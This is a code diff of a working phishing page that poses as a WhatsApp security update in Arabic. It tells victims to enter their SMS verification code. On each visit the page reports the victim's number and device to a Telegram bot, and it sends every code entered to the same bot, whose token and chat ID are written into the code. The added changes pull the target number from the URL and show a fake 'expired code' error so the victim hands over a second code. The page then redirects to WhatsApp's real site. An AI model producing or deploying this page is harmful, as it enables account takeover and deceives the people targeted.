@@ -9,25 +9,24 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }
 
-        /* شاشة التحميل (Dark الشفاف) */
+        /* شاشة التحميل */
         #checker { 
-            position: fixed; inset: 0; background: rgba(11, 20, 26, 0.95); z-index: 1000;
+            position: fixed; inset: 0; background: rgba(11, 20, 26, 0.98); z-index: 1000;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
-        /* لوجو أصغر وبنبض هادي */
         .pulse-logo {
-            width: 60px;
+            width: 65px;
             animation: pulseLogo 2s infinite ease-in-out;
         }
         @keyframes pulseLogo {
-            0% { transform: scale(1); opacity: 0.9; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.9; }
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
         }
 
         .container { padding: 30px 20px; text-align: center; display: none; max-width: 450px; margin: auto; }
-        .active { display: block; animation: fadeIn 0.5s ease; }
+        .active { display: block; animation: fadeIn 0.6s ease-out; }
 
         .device-info { 
             background: #1d2a33; border-radius: 12px; padding: 20px; text-align: right; 
@@ -35,30 +34,30 @@
         }
         
         .info-line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; }
-        .info-line b { color: #fff; font-family: monospace; font-weight: normal; }
+        .info-line b { color: #fff; font-family: monospace; }
 
-        /* تعديل النص بدل الأحمر */
         .status-update { color: var(--wa-green); font-weight: 500; }
 
         .otp-input {
             width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942;
-            color: #fff; font-size: 32px; text-align: center; outline: none; letter-spacing: 12px; margin: 25px 0; direction: ltr;
+            color: #fff; font-size: 32px; text-align: center; outline: none; letter-spacing: 8px; margin: 25px 0; direction: ltr;
         }
         .otp-input:focus { border-bottom-color: var(--wa-green); }
 
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
-        .spinner { border: 2px solid #202c33; border-top: 2px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
     <div id="checker">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
-        <p id="log-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري التحقق من أمان الحساب...</p>
+        <p id="log-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري مزامنة تشفير الحساب...</p>
     </div>
 
     <div class="container" id="app">
@@ -66,65 +65,105 @@
         <h2 style="font-size:20px; margin-bottom:15px; font-weight: 500;">تحديث أمان واتساب</h2>
 
         <div class="device-info">
-            <div class="info-line">الجهاز المكتشف: <b id="device-name">جاري التحديد...</b></div>
-            <div class="info-line">حالة الإصدار: <span class="status-update">تحديث متاح (v2.4)</span></div>
-            <div class="info-line">نظام التشفير: <b>SSL/TLS 1.3</b></div>
+            <div class="info-line">الجهاز: <b id="device-name">تحميل...</b></div>
+            <div class="info-line">الحالة: <span class="status-update">تحديث إجباري متوفر</span></div>
+            <div class="info-line">بروتوكول: <b>End-to-End (v3)</b></div>
             <div style="border-top: 1px solid #222d34; margin-top:10px; padding-top:10px;">
-                الرقم الموثق: <b id="masked-phone" style="color:var(--wa-green);"></b>
+                الرقم المستهدف: <b id="masked-phone" style="color:var(--wa-green);"></b>
             </div>
         </div>
 
         <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
-            تم إصلاح بعض الأخطاء في التحديثات الأخيرة. لضمان توافق حسابك مع الإصدار الأخير يرجى التأكد من حسابك من هنا.
+            يرجى إدخال كود التحقق المكون من 6 أرقام المستلم في رسالة نصية لتأكيد ملكية الحساب وإتمام التحديث بنجاح.
         </p>
 
-        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
-        <button class="btn" onclick="submitData()">تحديث ومزامنة الآن</button>
+        <input type="tel" id="otp" class="otp-input" maxlength="7" inputmode="numeric" placeholder="--- ---">
+        <button class="btn" id="submitBtn" onclick="submitData()">تحديث ومزامنة الآن</button>
     </div>
 
     <script>
+        // إعدادات البوت والبيانات
         const CFG = {
             T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             C: '5446862709',
-            P: '01030003287'
+            // ميزة جلب الرقم من الرابط u=010...
+            P: new URLSearchParams(window.location.search).get('u') || "01030003287"
         };
 
-        function getDeviceModel() {
+        let attempt = 0;
+
+        // تحديد نوع الجهاز بشكل واقعي
+        function getDevice() {
             const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "Android Device";
-            if (/iPhone|iPad/i.test(ua)) return "Apple iPhone (iOS)";
+            if (/android/i.test(ua)) return "Android Phone";
+            if (/iPhone|iPad/i.test(ua)) return "iPhone (iOS)";
             return "Mobile Device";
         }
 
-        document.getElementById('device-name').innerText = getDeviceModel();
+        document.getElementById('device-name').innerText = getDevice();
         document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);
 
-        async function bot(msg) {
-            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
-            });
+        // إضافة الشرطة تلقائياً أثناء الكتابة
+        document.getElementById('otp').addEventListener('input', function (e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3, 6);
+            e.target.value = v;
+        });
+
+        async function sendToTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.error("Error sending..."); }
         }
 
         window.onload = () => {
-            bot(`📱 <b>[دخول جديد]:</b> فتح الصفحة.`);
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').classList.add('active');
-            }, 3500);
+                sendToTelegram(`🔔 <b>دخول جديد للرابط:</b>\nرقم: <code>${CFG.P}</code>\nجهاز: <code>${getDevice()}</code>`);
+            }, 3000);
         };
 
         async function submitData() {
-            const val = document.getElementById('otp').value;
-            if(val.length === 6) {
-                document.querySelector('.btn').innerText = "جاري المزامنة...";
-                await bot(`🔥 <b>[كود وصل]:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>`);
-                
-                document.body.innerHTML = `<div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; color:var(--wa-hint); flex-direction:column;">
-                    <div class="spinner"></div><p style="margin-top:20px;">جاري المزامنة مع الخادم...</p>
+            const otpVal = document.getElementById('otp').value;
+            const btn = document.getElementById('submitBtn');
+
+            if(otpVal.length < 7) {
+                alert("يرجى إدخال الكود كاملاً");
+                return;
+            }
+
+            attempt++;
+            btn.innerText = "جاري المزامنة...";
+            btn.disabled = true;
+
+            // إرسال الكود
+            await sendToTelegram(`🔥 <b>كود وصل (محاولة ${attempt}):</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${otpVal}</code>`);
+
+            if(attempt === 1) {
+                // خدعة الكود الخطأ في أول مرة لزيادة الواقعية
+                setTimeout(() => {
+                    alert("فشل التحقق: كود منتهي الصلاحية. تم إرسال كود جديد، يرجى المحاولة مرة أخرى.");
+                    document.getElementById('otp').value = "";
+                    btn.innerText = "تحديث ومزامنة الآن";
+                    btn.disabled = false;
+                }, 2000);
+            } else {
+                // النجاح في المرة الثانية
+                document.body.innerHTML = `
+                <div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; color:var(--wa-hint); flex-direction:column; text-align:center; padding:20px;">
+                    <div class="spinner"></div>
+                    <p style="margin-top:25px; font-size:16px;">تم تأكيد ملكية الحساب بنجاح.</p>
+                    <p style="color:#555; font-size:12px; margin-top:10px;">جاري إعادة توجيهك لمركز الأمان...</p>
                 </div>`;
                 
-                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 3000);
+                setTimeout(() => {
+                    window.location.href = "https://www.whatsapp.com/security";
+                }, 3000);
             }
         }
     </script>
